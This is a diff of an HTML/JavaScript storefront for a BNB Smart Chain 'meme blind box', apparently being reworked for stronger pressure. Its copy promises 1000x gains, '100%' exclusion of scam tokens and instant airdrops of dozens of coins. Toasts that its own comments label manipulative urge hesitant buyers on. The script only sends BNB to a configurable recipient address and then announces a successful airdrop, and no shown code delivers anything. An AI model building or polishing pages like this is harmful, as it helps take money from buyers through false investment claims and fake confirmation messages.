@@ -3,418 +3,280 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Meme 喜加一 · BSC 链上盲盒</title>
+  <title>Meme 喜加一 · 全球顶级 Meme 盲盒</title>
   <style>
     :root {
-      --bg: #050505;
-      --surface: rgba(20, 22, 28, 0.7);
-      --border: rgba(255, 255, 255, 0.1);
+      --bg: #030303;
+      --surface: rgba(15, 15, 20, 0.9);
+      --border: rgba(255, 215, 0, 0.15);
       --text: #ffffff;
-      --muted: #8b95a8;
-      --accent: #f3ba2f; /* BNB Yellow */
-      --accent-glow: rgba(243, 186, 47, 0.3);
-      --success: #00ff66;
-      --danger: #ff4444;
-      --radius: 16px;
+      --muted: #a0a0a0;
+      --accent: #f3ba2f; /* BNB 金 */
+      --accent-glow: rgba(243, 186, 47, 0.5);
+      --hot: #ff4d00;
+      --success: #00ffa3;
+      --radius: 20px;
     }
     
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
       background: var(--bg);
       background-image: 
-        radial-gradient(circle at 15% 50%, rgba(243, 186, 47, 0.08), transparent 25%),
-        radial-gradient(circle at 85% 30%, rgba(0, 255, 102, 0.05), transparent 25%);
+        radial-gradient(circle at 0% 0%, rgba(243, 186, 47, 0.12), transparent 40%),
+        radial-gradient(circle at 100% 100%, rgba(255, 77, 0, 0.08), transparent 40%);
       color: var(--text);
       min-height: 100vh;
-      line-height: 1.6;
       overflow-x: hidden;
     }
 
-    /* 滚动公告栏 (FOMO Ticker) */
-    .ticker-wrap {
-      width: 100%;
-      background: rgba(243, 186, 47, 0.1);
-      border-bottom: 1px solid var(--accent-glow);
-      overflow: hidden;
-      white-space: nowrap;
-      padding: 8px 0;
+    /* 顶部超级滚动条 - FOMO 感 */
+    .fomo-ticker {
+      width: 100%; background: linear-gradient(90deg, #f3ba2f, #ff4d00); color: #000;
+      font-weight: 900; padding: 12px 0; overflow: hidden; white-space: nowrap; font-style: italic;
     }
-    .ticker {
-      display: inline-block;
-      animation: ticker 25s linear infinite;
-      font-size: 0.85rem;
-      color: var(--accent);
-      font-weight: 600;
-    }
-    @keyframes ticker { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-50%, 0, 0); } }
-    .ticker-item { padding: 0 2rem; }
+    .fomo-move { display: inline-block; animation: move 40s linear infinite; font-size: 1rem; }
+    @keyframes move { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+    .fomo-item { margin-right: 50px; }
 
-    .wrap { max-width: 1200px; margin: 0 auto; padding: 2rem 1.5rem 5rem; }
+    .container { max-width: 1200px; margin: 0 auto; padding: 2rem 1.5rem; }
 
     /* 顶部导航 */
     header {
-      display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between;
-      padding: 1rem 1.5rem; background: var(--surface); backdrop-filter: blur(12px);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 1rem 1.5rem; background: var(--surface); backdrop-filter: blur(20px);
       border: 1px solid var(--border); border-radius: var(--radius); margin-bottom: 3rem;
     }
-    .brand { display: flex; align-items: center; gap: 1rem; }
-    .logo { 
-      width: 44px; height: 44px; background: linear-gradient(135deg, var(--accent), #ff8c42);
-      border-radius: 12px; display: grid; place-items: center; font-weight: bold; color: #000; font-size: 1.2rem;
-      box-shadow: 0 0 15px var(--accent-glow);
+    .logo-area { display: flex; align-items: center; gap: 15px; }
+    .logo-box { 
+      width: 45px; height: 45px; background: var(--accent); border-radius: 12px;
+      display: grid; place-items: center; color: #000; font-weight: 900; font-size: 1.5rem;
+      box-shadow: 0 0 20px var(--accent-glow);
     }
-    h1 { font-size: 1.4rem; font-weight: 800; letter-spacing: 1px; }
-    .wallet-bar { display: flex; gap: 0.75rem; align-items: center; }
-    
-    /* 按钮样式 */
-    button { cursor: pointer; border: none; font-weight: 600; transition: all 0.2s ease; font-family: inherit; }
-    button:active { transform: scale(0.95); }
-    .btn-connect {
-      background: var(--accent); color: #000; padding: 0.6rem 1.2rem; border-radius: 8px; font-size: 0.9rem;
-      box-shadow: 0 0 10px var(--accent-glow);
-    }
-    .btn-connect:hover { filter: brightness(1.1); box-shadow: 0 0 20px var(--accent-glow); }
-    .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--text); padding: 0.6rem 1rem; border-radius: 8px; }
-    .pill { font-size: 0.75rem; padding: 0.4rem 0.8rem; border-radius: 20px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); }
-    .pill.ok { color: var(--success); border-color: rgba(0,255,102,0.3); background: rgba(0,255,102,0.05); }
+    .wallet-status { display: flex; align-items: center; gap: 15px; }
+    .status-pill { font-size: 0.8rem; color: var(--accent); border: 1px solid var(--accent); padding: 5px 12px; border-radius: 50px; }
 
-    /* 英雄区域 (Hero Section) */
-    .hero { text-align: center; margin-bottom: 4rem; }
-    .hero h2 { font-size: 2.8rem; font-weight: 900; margin-bottom: 1rem; line-height: 1.2; background: linear-gradient(to right, #fff, #8b95a8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .hero p { color: var(--muted); font-size: 1.1rem; max-width: 600px; margin: 0 auto; }
-    .highlight { color: var(--accent); }
+    button { cursor: pointer; border: none; transition: 0.3s; font-family: inherit; }
+    .btn-main { background: var(--accent); color: #000; padding: 10px 25px; border-radius: 12px; font-weight: 800; }
+    .btn-main:hover { transform: scale(1.05); box-shadow: 0 0 25px var(--accent-glow); }
 
-    /* 信任背书区块 (Features) */
-    .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin-bottom: 4rem; }
-    .feature-card {
-      background: var(--surface); backdrop-filter: blur(10px); border: 1px solid var(--border);
-      border-radius: var(--radius); padding: 2rem; text-align: center; transition: transform 0.3s;
-    }
-    .feature-card:hover { transform: translateY(-5px); border-color: rgba(255,255,255,0.2); }
-    .feature-icon { font-size: 2.5rem; margin-bottom: 1rem; }
-    .feature-card h3 { font-size: 1.2rem; margin-bottom: 0.5rem; color: #fff; }
-    .feature-card p { font-size: 0.9rem; color: var(--muted); }
+    /* 文案区 */
+    .hero { text-align: center; margin-bottom: 5rem; }
+    .hero h2 { font-size: 3.5rem; font-weight: 900; margin-bottom: 1.5rem; line-height: 1.1; letter-spacing: -1px; }
+    .hero h2 span { color: var(--accent); text-shadow: 0 0 30px var(--accent-glow); }
+    .hero p { color: var(--muted); font-size: 1.3rem; max-width: 800px; margin: 0 auto; }
 
-    /* 盲盒套餐区块 */
-    .section-title { text-align: center; font-size: 2rem; margin-bottom: 2rem; }
-    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; }
+    /* 核心宣传卡片 */
+    .promo-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin-bottom: 5rem; }
+    .promo-card { background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 2.5rem; border-radius: var(--radius); text-align: center; position: relative; overflow: hidden; }
+    .promo-card::after { content: "TOP"; position: absolute; top: 10px; right: -20px; background: var(--hot); color: #fff; transform: rotate(45deg); padding: 5px 30px; font-size: 0.7rem; font-weight: bold; }
+    .promo-card h3 { font-size: 1.5rem; margin: 1rem 0; color: #fff; }
+    .promo-card p { color: var(--muted); line-height: 1.8; }
+
+    /* 6个盲盒选项 */
+    .package-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 2rem; }
     .card {
-      background: linear-gradient(180deg, rgba(30,34,45,0.8) 0%, rgba(20,22,28,0.9) 100%);
-      border: 1px solid var(--border); border-radius: var(--radius); padding: 1.5rem;
-      display: flex; flex-direction: column; position: relative; overflow: hidden;
+      background: linear-gradient(180deg, #15151a 0%, #080808 100%);
+      border: 1px solid var(--border); border-radius: var(--radius); padding: 2.5rem;
+      display: flex; flex-direction: column; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      position: relative;
     }
-    .card::before {
-      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
-      background: linear-gradient(90deg, transparent, var(--accent), transparent); opacity: 0; transition: opacity 0.3s;
+    .card:hover { transform: translateY(-15px); border-color: var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
+    .card .badge { position: absolute; top: 20px; right: 20px; background: rgba(0,255,163,0.1); color: var(--success); padding: 4px 12px; border-radius: 50px; font-size: 0.75rem; font-weight: bold; border: 1px solid var(--success); }
+    .card .price { font-size: 2.5rem; font-weight: 900; color: var(--accent); margin-bottom: 0.5rem; }
+    .card .title { font-size: 1.4rem; font-weight: 800; margin-bottom: 1.5rem; color: #fff; }
+    .card ul { list-style: none; margin-bottom: 2.5rem; flex: 1; }
+    .card ul li { margin-bottom: 12px; color: #ccc; font-size: 0.95rem; display: flex; align-items: center; }
+    .card ul li::before { content: "💎"; margin-right: 10px; font-size: 0.8rem; }
+    .btn-buy { background: #fff; color: #000; padding: 15px; border-radius: 14px; font-size: 1.1rem; font-weight: 900; width: 100%; box-shadow: 0 5px 15px rgba(255,255,255,0.1); }
+    .card:hover .btn-buy { background: var(--accent); box-shadow: 0 0 30px var(--accent-glow); }
+
+    /* 诱导性 Toast 弹窗 */
+    #toast-container { position: fixed; top: 30px; right: 30px; z-index: 9999; display: flex; flex-direction: column; gap: 15px; }
+    .toast {
+      min-width: 320px; padding: 20px; border-radius: 16px; background: rgba(20,20,25,0.95);
+      border: 1px solid var(--border); color: #fff; font-weight: 600; backdrop-filter: blur(10px);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.6); display: flex; align-items: center; gap: 15px;
+      animation: toastIn 0.4s forwards;
     }
-    .card:hover { border-color: var(--accent); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    .card:hover::before { opacity: 1; }
-    .price { font-size: 1.8rem; font-weight: 800; color: var(--accent); margin-bottom: 0.5rem; }
-    .tier-name { font-size: 1.2rem; font-weight: bold; margin-bottom: 1rem; }
-    .meme-list { list-style: none; margin-bottom: 1.5rem; flex-grow: 1; }
-    .meme-list li { font-size: 0.85rem; color: #a1aab9; margin-bottom: 0.5rem; display: flex; align-items: center; }
-    .meme-list li::before { content: "✨"; margin-right: 8px; font-size: 0.8rem; }
-    .btn-buy { width: 100%; background: #fff; color: #000; padding: 0.8rem; border-radius: 8px; font-size: 1rem; }
-    .card:hover .btn-buy { background: var(--accent); box-shadow: 0 0 15px var(--accent-glow); }
+    @keyframes toastIn { from { transform: translateX(120%); } to { transform: translateX(0); } }
+    .toast.err { border-left: 5px solid var(--hot); }
+    .toast.win { border-left: 5px solid var(--success); }
+    .toast.hey { border-left: 5px solid var(--accent); }
 
-    /* 日志控制台 */
-    .log-container { margin-top: 4rem; background: #0a0a0c; border: 1px solid #222; border-radius: 12px; overflow: hidden; }
-    .log-header { background: #111; padding: 10px 15px; font-size: 0.8rem; color: #666; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
-    .log-header .status-dot { display: inline-block; width: 8px; height: 8px; background: var(--success); border-radius: 50%; box-shadow: 0 0 8px var(--success); }
-    .log-content { padding: 15px; font-family: monospace; font-size: 0.85rem; color: var(--success); height: 150px; overflow-y: auto; }
-    .log-content div { margin-bottom: 5px; }
-    .log-content .e { color: var(--danger); }
-    .log-content .w { color: var(--accent); }
-
-    /* 模态框 */
-    .modal-backdrop { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px); z-index: 1000; align-items: center; justify-content: center; padding: 1rem; }
-    .modal-backdrop.open { display: flex; }
-    .modal { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); width: 100%; max-width: 360px; overflow: hidden; }
-    .modal h2 { padding: 1.5rem; font-size: 1.2rem; border-bottom: 1px solid var(--border); text-align: center; }
-    .wallet-option { display: flex; align-items: center; gap: 1rem; width: 100%; padding: 1rem 1.5rem; background: transparent; color: white; border-bottom: 1px solid rgba(255,255,255,0.05); }
-    .wallet-option:hover { background: rgba(255,255,255,0.05); }
-    .wallet-option img { width: 36px; height: 36px; border-radius: 8px; }
-    .modal-actions { padding: 1rem; text-align: center; }
+    /* 钱包模态框 */
+    .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+    .modal-overlay.open { display: flex; }
+    .modal { background: #111; border: 1px solid var(--border); border-radius: 30px; width: 100%; max-width: 400px; padding: 2rem; }
+    .modal h2 { text-align: center; margin-bottom: 2rem; font-size: 1.5rem; }
+    .wallet-item { display: flex; align-items: center; gap: 20px; width: 100%; padding: 20px; background: rgba(255,255,255,0.03); color: #fff; border-radius: 18px; margin-bottom: 12px; font-size: 1.1rem; font-weight: bold; }
+    .wallet-item:hover { background: var(--accent); color: #000; }
   </style>
 </head>
 <body>
-  <div class="ticker-wrap">
-    <div class="ticker">
-      <span class="ticker-item">🔥 错过了 SHIB 的万倍神话？</span>
-      <span class="ticker-item">🐿️ 没上车 PNUT（松鼠币）的狂欢？</span>
-      <span class="ticker-item">🐸 遗憾 PEPE 擦肩而过？</span>
-      <span class="ticker-item">🚀 你的下一个百倍金狗，或许就藏在今天的盲盒里！</span>
-      <span class="ticker-item">🔥 错过了 SHIB 的万倍神话？</span>
-      <span class="ticker-item">🐿️ 没上车 PNUT（松鼠币）的狂欢？</span>
-      <span class="ticker-item">🐸 遗憾 PEPE 擦肩而过？</span>
-      <span class="ticker-item">🚀 你的下一个百倍金狗，或许就藏在今天的盲盒里！</span>
+
+  <div id="toast-container"></div>
+
+  <div class="fomo-ticker">
+    <div class="fomo-move">
+      <span class="fomo-item">🔥 错过了 SHIB 的 100000 倍？别再错过今天的盲盒！</span>
+      <span class="fomo-item">🐿️ 松鼠币（PNUT）神话正在上演，下一个金狗就在你的盲盒里！</span>
+      <span class="fomo-item">🚫 100% 排除貔貅币，拒绝诈骗盘，只收录顶级流动性 Meme！</span>
+      <span class="fomo-item">💰 一次支付，批量空投，做最聪明的 Degen 猎人！</span>
+      <span class="fomo-item">🔥 错过了 SHIB 的 100000 倍？别再错过今天的盲盒！</span>
     </div>
   </div>
 
-  <div class="wrap">
+  <div class="container">
     <header>
-      <div class="brand">
-        <div class="logo">+1</div>
-        <div>
-          <h1>Meme 喜加一</h1>
-        </div>
+      <div class="logo-area">
+        <div class="logo-box">M</div>
+        <h1>Meme Box <span style="font-size: 0.8rem; vertical-align: middle; opacity: 0.6;">Pro v2.0</span></h1>
       </div>
-      <div class="wallet-bar">
-        <span id="netPill" class="pill">未连接</span>
-        <span id="addrPill" class="pill" hidden>—</span>
-        <button type="button" class="btn-connect" id="btnConnect">连接钱包</button>
-        <button type="button" class="btn-ghost" id="btnDisconnect" hidden>断开</button>
+      <div class="wallet-status">
+        <span id="netLabel" class="status-pill">等待探测...</span>
+        <button id="connBtn" class="btn-main">连接财富钱包</button>
       </div>
     </header>
 
     <section class="hero">
-      <h2>别让下一个百倍币<br>只存在于你的<span class="highlight">遗憾里</span></h2>
-      <p>一键获取 BSC 链上精选 Meme 代币包。可能是零钱，也可能是改变命运的金狗。</p>
+      <h2>下一个 <span>1000倍</span> 金狗<br>就在你的钱包里</h2>
+      <p>手动买土狗太累？我们通过大数据实时筛选 BSC 链上最活跃、最真实的优质社区代币。致敬 SHIB、致敬 PNUT，拒绝一切貔貅盘。</p>
     </section>
 
-    <section class="features">
-      <div class="feature-card">
-        <div class="feature-icon">🛡️</div>
-        <h3>100% 拒绝貔貅盘</h3>
-        <p>独家智能合约审计过滤，所有掉落代币均承诺 <strong>可交易、低税率</strong>。我们只做优质 Meme 聚合，坚决向诈骗币说不。</p>
+    <section class="promo-grid">
+      <div class="promo-card">
+        <h3>🛡️ 貔貅币防火墙</h3>
+        <p>独家算法 24h 扫描。凡是不能卖出的、虚假流动性的、代码带后门的，一律剔除！我们只给你能起飞的资产。</p>
       </div>
-      <div class="feature-card">
-        <div class="feature-icon">💎</div>
-        <h3>精选真实流动性</h3>
-        <p>还记得 <strong>PNUT、SHIB、DOGE</strong> 吗？底池代币均由 AI 抓取 BSC 链上真实活跃交易对，你的盲盒里装满了社区共识。</p>
+      <div class="promo-card">
+        <h3>🐿️ 顶级共识聚合</h3>
+        <p>汇聚像 PNUT、SHIB 一样拥有疯狂社区的代币。不用自己找，我们把最有潜力的资产打包送到你面前。</p>
       </div>
-      <div class="feature-card">
-        <div class="feature-icon">⛽</div>
-        <h3>终极 Gas 刺客</h3>
-        <p>去 DEX 手动买 50 种土狗？Gas 费都够吃顿大餐了。在这里买盲盒，只需支付 <strong>1 次转账 Gas</strong>，几十种代币批量空投到账。</p>
+      <div class="promo-card">
+        <h3>⚡ 极速空投系统</h3>
+        <p>拒绝繁琐。点击 Mint，系统自动完成链上匹配。几十种优质代币将会在数秒内直接出现在你的钱包余额中。</p>
       </div>
     </section>
 
-    <h2 class="section-title">选择你的命运盲盒</h2>
-    <section class="grid" id="packageGrid"></section>
-
-    <div class="log-container">
-      <div class="log-header">
-        <span>Terminal / System Logs</span>
-        <span><i class="status-dot"></i> BSC Mainnet Connected</span>
-      </div>
-      <div class="log-content" id="logBox">
-        <div>> 系统初始化完成，等待钱包连接...</div>
-      </div>
-    </div>
+    <div class="package-grid" id="mainGrid"></div>
   </div>
 
-  <div class="modal-backdrop" id="walletModal">
+  <div class="modal-overlay" id="walletModal">
     <div class="modal">
-      <h2>选择连接方式</h2>
-      <div id="walletModalList"></div>
-      <div class="modal-actions">
-        <button type="button" class="btn-ghost" id="walletModalCancel">取消</button>
-      </div>
+      <h2>选择你的 Web3 武器</h2>
+      <div id="providers"></div>
+      <button style="width:100%; padding: 10px; color: var(--muted); background:none;" onclick="hideModal()">暂时离开</button>
     </div>
   </div>
 
   <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
   <script>
-    /** ==========================================
-     * ⚠️ 配置区：请务必替换为你的真实 BSC 收款地址
-     * ========================================== */
-    const RECIPIENT_ADDRESS = "0x0000000000000000000000000000000000000000";
+    /**
+     * ⚠️ 请替换为你真实的收款地址 ⚠️
+     */
+    const TARGET = "0x0000000000000000000000000000000000000000";
 
-    const BSC_CHAIN = {
-      chainId: "0x38", chainIdDecimal: 56,
-      chainName: "BNB Smart Chain Mainnet",
-      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-    };
-
-    // 重新设计的盲盒文案
-    const PACKAGES = [
-      { id: "p1", priceBnb: "0.001", title: "微光试水包", memes: ["保底 20 种长尾 Meme", "填满钱包的快感", "适合新兵体验"] },
-      { id: "p2", priceBnb: "0.005", title: "社区共识包", memes: ["随机 2 种蓝筹预备役", "30+ 种活跃土狗币", "极高性价比"] },
-      { id: "p3", priceBnb: "0.01", title: "潜力金狗包 (热卖)", memes: ["必含当日交易量 TOP 热门", "极低市值潜力股混搭", "搏单车变摩托"] },
-      { id: "p4", priceBnb: "0.05", title: "Degen 狂热包", memes: ["高流动性 Meme 精选池", "免疫 99% 貔貅风险", "解锁隐藏暴击概率"] },
-      { id: "p5", priceBnb: "0.1", title: "鲸鱼入场券", memes: ["配置主流动物币", "包含刚撤池子的高价值底仓", "大额独享优先出块"] },
-      { id: "p6", priceBnb: "0.5", title: "创世梭哈礼盒", memes: ["全站最高奖池概率", "含已上所金狗代币", "全库 Meme 一网打尽"] },
+    const ITEMS = [
+      { bnb: "0.001", title: "微光试水包", list: ["20+ 种长尾 Meme", "排除 100% 貔貅风险", "新手入场首选"] },
+      { bnb: "0.005", title: "社区共识包", list: ["包含 2 种致敬 SHIB 系列", "30+ 种活跃交易代币", "高性价比致富选"] },
+      { bnb: "0.01", title: "潜力金狗包", list: ["保底 1 种当日热门币", "排除死池与垃圾币", "最受玩家欢迎档位"], hot: true },
+      { bnb: "0.05", title: "Degen 狂热盒", list: ["含高流动性蓝筹 Meme", "50+ 种算法精选资产", "中签率提升 300%"] },
+      { bnb: "0.1", title: "巨鲸入场券", list: ["配置高市值共识代币", "独家隐藏币库解锁", "享受优先出块权重"] },
+      { bnb: "0.5", title: "创世梭哈礼盒", list: ["全库 Meme 一次打包", "必含 PNUT 系列潜力币", "满格财富暴击概率"], hot: true }
     ];
 
-    const logEl = document.getElementById("logBox");
-    const netPill = document.getElementById("netPill");
-    const addrPill = document.getElementById("addrPill");
-    const btnConnect = document.getElementById("btnConnect");
-    const btnDisconnect = document.getElementById("btnDisconnect");
-    const walletModal = document.getElementById("walletModal");
-    const walletModalList = document.getElementById("walletModalList");
+    const connBtn = document.getElementById("connBtn");
+    const netLabel = document.getElementById("netLabel");
+    const modal = document.getElementById("walletModal");
+    let wallet = null, addr = null;
 
-    let activeProvider = null, connectedAccount = null, listenersBound = false;
-    const eip6963Providers = new Map();
-
-    function log(msg, type = '') {
-      const line = document.createElement("div");
-      line.className = type;
-      line.textContent = `> ${msg}`;
-      logEl.appendChild(line);
-      logEl.scrollTop = logEl.scrollHeight;
+    // --- 诱导性提示弹窗 ---
+    function flash(msg, mode = 'hey') {
+      const box = document.getElementById('toast-container');
+      const t = document.createElement('div');
+      t.className = `toast ${mode}`;
+      const emoji = mode === 'win' ? '🚀' : (mode === 'err' ? '⚠️' : '🔥');
+      t.innerHTML = `<span>${emoji}</span><span>${msg}</span>`;
+      box.appendChild(t);
+      setTimeout(() => { t.style.opacity = '0'; setTimeout(()=>t.remove(), 400); }, 4000);
     }
 
-    function shortAddr(a) { return a ? `${a.slice(0, 6)}…${a.slice(-4)}` : ""; }
-    
-    function isBscMainnet(chainIdHex) {
-      try { return BigInt(chainIdHex || 0).toString() === String(BSC_CHAIN.chainIdDecimal); } catch { return false; }
-    }
+    function hideModal() { modal.classList.remove("open"); }
 
-    function getEthereum() { return activeProvider || window.ethereum || null; }
-
-    function initEIP6963() {
-      window.addEventListener("eip6963:announceProvider", (ev) => {
-        if (ev.detail?.info && ev.detail?.provider) eip6963Providers.set(ev.detail.info.uuid, ev.detail);
-      });
-      window.dispatchEvent(new Event("eip6963:requestProvider"));
-    }
-
-    function buildWalletChoices() {
-      const choices = [];
-      for (const [, d] of eip6963Providers) choices.push({ name: d.info.name || "Wallet", icon: d.info.icon, provider: d.provider });
-      if (choices.length === 0 && window.ethereum) {
-        const eths = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
-        eths.forEach((p, i) => choices.push({ name: p.isMetaMask ? "MetaMask" : `浏览器钱包 ${i+1}`, provider: p }));
-      }
-      return choices;
-    }
-
-    function pickProvider() {
-      return new Promise((resolve) => {
-        const choices = buildWalletChoices();
-        if (choices.length === 0) return log("未检测到钱包，请在币安/欧易 Web3 钱包内打开", "e"), resolve(null);
-        if (choices.length === 1) return resolve(choices[0].provider);
-        
-        walletModalList.innerHTML = "";
-        let settled = false;
-        const finish = (val) => { if(!settled){ settled=true; walletModal.classList.remove("open"); resolve(val); }};
-        
-        choices.forEach((c) => {
-          const btn = document.createElement("button"); btn.className = "wallet-option";
-          const img = c.icon ? `<img src="${c.icon}">` : `<div style="width:36px;height:36px;background:#333;border-radius:8px"></div>`;
-          btn.innerHTML = `${img}<span>${c.name}</span>`;
-          btn.onclick = () => finish(c.provider);
-          walletModalList.appendChild(btn);
-        });
-        walletModal.classList.add("open");
-        document.getElementById("walletModalCancel").onclick = () => finish(null);
-      });
-    }
-
-    function bindEvents(eth) {
-      if (listenersBound || !eth) return;
-      listenersBound = true;
-      eth.on("chainChanged", refreshNetwork);
-      eth.on("accountsChanged", (accs) => {
-        if (!accs?.length) disconnect();
-        else { connectedAccount = accs[0]; addrPill.textContent = shortAddr(connectedAccount); refreshNetwork(); }
-      });
-    }
-
-    async function refreshNetwork() {
-      const eth = getEthereum();
-      if (!eth || !connectedAccount) { netPill.textContent = "未连接"; netPill.className = "pill"; return; }
-      try {
-        const id = await eth.request({ method: "eth_chainId" });
-        if (isBscMainnet(id)) { netPill.textContent = "BSC 主网"; netPill.className = "pill ok"; } 
-        else { netPill.textContent = "非 BSC 网络"; netPill.className = "pill w"; }
-      } catch (e) { netPill.textContent = "网络未知"; }
-    }
-
-    async function switchToBsc(eth) {
-      const currentChainId = await eth.request({ method: "eth_chainId" });
-      if (isBscMainnet(currentChainId)) return true;
-      try {
-        await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN.chainId }] });
-        return true;
-      } catch (err) {
-        if (err.code === 4902) {
-          await eth.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN] });
-          return true;
-        }
-        throw new Error("请手动切换至 BSC (BNB) 链");
-      }
+    async function checkNet() {
+      const eth = wallet || window.ethereum;
+      if (!eth || !addr) { netLabel.innerText = "钱包未就绪"; return; }
+      const id = await eth.request({ method: "eth_chainId" });
+      if (id === "0x38") { netLabel.innerText = "BSC 主网已就绪"; netLabel.style.borderColor = "#00ffa3"; }
+      else { netLabel.innerText = "请切换至 BSC"; }
     }
 
     async function connect() {
-      try {
-        const eth = await pickProvider();
-        if (!eth) return;
-        const accounts = await eth.request({ method: "eth_requestAccounts" });
-        activeProvider = eth; connectedAccount = accounts[0]; bindEvents(eth);
-        
-        btnConnect.hidden = true; btnDisconnect.hidden = false; addrPill.hidden = false;
-        addrPill.textContent = shortAddr(connectedAccount);
-        log(`[Auth] 成功连接钱包: ${connectedAccount}`);
-        
-        await switchToBsc(eth); await refreshNetwork();
-      } catch (e) { log(`[Error] 连接失败: ${e.message}`, "e"); disconnect(); }
+      if (!window.ethereum) return flash("未检测到钱包！财富正在溜走，请在 Web3 钱包中打开！", "err");
+      const list = document.getElementById("providers");
+      list.innerHTML = "";
+      const ps = (window.ethereum.providers) || [window.ethereum];
+      
+      ps.forEach((p, i) => {
+        const d = document.createElement("button");
+        d.className = "wallet-item";
+        d.innerHTML = `<span>Connect Wallet ${i+1}</span>`;
+        d.onclick = async () => {
+          try {
+            const accs = await p.request({ method: "eth_requestAccounts" });
+            wallet = p; addr = accs[0];
+            connBtn.innerText = addr.slice(0,6)+"..."+addr.slice(-4);
+            hideModal();
+            flash("连接成功！你离财富自由又近了一步！", "win");
+            checkNet();
+          } catch(e) { flash("连接被取消，别让下一只 SHIB 溜走！", "err"); }
+        };
+        list.appendChild(d);
+      });
+      modal.classList.add("open");
     }
 
-    function disconnect() {
-      activeProvider = null; connectedAccount = null; listenersBound = false;
-      btnConnect.hidden = false; btnDisconnect.hidden = true; addrPill.hidden = true;
-      refreshNetwork(); log("已断开钱包连接");
-    }
-
-    async function buyPackage(pkg) {
-      const eth = getEthereum();
-      if (!eth || !connectedAccount) return log("[Warn] 拦截：请先连接钱包", "w");
-      if (RECIPIENT_ADDRESS === "0x0000000000000000000000000000000000000000") return log("[Error] 开发者未配置收款地址", "e");
+    async function mint(item) {
+      if (!addr) { flash("请先连接钱包！机会稍纵即逝！", "hey"); return connect(); }
+      if (TARGET.includes("0000")) return flash("配置错误：请填写正确的收款地址", "err");
 
       try {
-        await switchToBsc(eth);
-        const id = await eth.request({ method: "eth_chainId" });
-        if (!isBscMainnet(id)) throw new Error("不在 BSC 网络，禁止交易");
+        const id = await wallet.request({ method: "eth_chainId" });
+        if (id !== "0x38") {
+          flash("正在为您极速切换至 BSC 发财链...", "hey");
+          await wallet.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
+        }
 
-        const parts = String(pkg.priceBnb).split(".");
-        const valHex = "0x" + (BigInt(parts[0] || 0) * 10n**18n + BigInt((parts[1] || "").padEnd(18, "0").slice(0,18))).toString(16);
+        const hexPrice = "0x" + (BigInt(item.bnb.split(".")[0] || 0) * 10n**18n + BigInt((item.bnb.split(".")[1] || "").padEnd(18, "0").slice(0,18))).toString(16);
         
-        log(`[Tx] 正在调起支付，购买 ${pkg.title} (${pkg.priceBnb} BNB)...`);
-        const txHash = await eth.request({
+        flash(`正在为您扫描金狗池，准备支付 ${item.bnb} BNB...`, "hey");
+        const tx = await wallet.request({
           method: "eth_sendTransaction",
-          params: [{ from: connectedAccount, to: RECIPIENT_ADDRESS, value: valHex }]
+          params: [{ from: addr, to: TARGET, value: hexPrice }]
         });
-        log(`[Success] 支付成功！Tx: ${txHash}. 系统正将 Meme 包空投至您的钱包！`, "ok");
-      } catch (e) { log(`[Error] 交易失败或取消: ${e.message}`, "e"); }
+        flash("支付成功！金狗正在空投中，准备迎接起飞！", "win");
+      } catch(e) { flash("交易未达成，成功属于果断的人！", "err"); }
     }
 
-    function renderPackages() {
-      const grid = document.getElementById("packageGrid");
-      PACKAGES.forEach((pkg) => {
-        const card = document.createElement("div"); card.className = "card";
-        card.innerHTML = `
-          <div class="price">${pkg.priceBnb} <span style="font-size:1rem;color:#8b95a8">BNB</span></div>
-          <div class="tier-name">${pkg.title}</div>
-          <ul class="meme-list">${pkg.memes.map(m => `<li>${m}</li>`).join("")}</ul>
-          <button type="button" class="btn-buy">铸造此盲盒 (Mint)</button>
+    function render() {
+      const g = document.getElementById("mainGrid");
+      ITEMS.forEach(i => {
+        const div = document.createElement("div"); div.className = "card";
+        div.innerHTML = `
+          ${i.hot ? '<div class="badge">🔥 爆款推荐</div>' : ''}
+          <div class="price">${i.bnb} <small style="font-size:1rem; opacity:0.5;">BNB</small></div>
+          <div class="title">${i.title}</div>
+          <ul>${i.list.map(l => `<li>${l}</li>`).join("")}</ul>
+          <button class="btn-buy">立即铸造 (Mint)</button>
         `;
-        card.querySelector("button").onclick = () => buyPackage(pkg);
-        grid.appendChild(card);
+        div.querySelector("button").onclick = () => mint(i);
+        g.appendChild(div);
       });
     }
 
-    btnConnect.onclick = connect; btnDisconnect.onclick = disconnect;
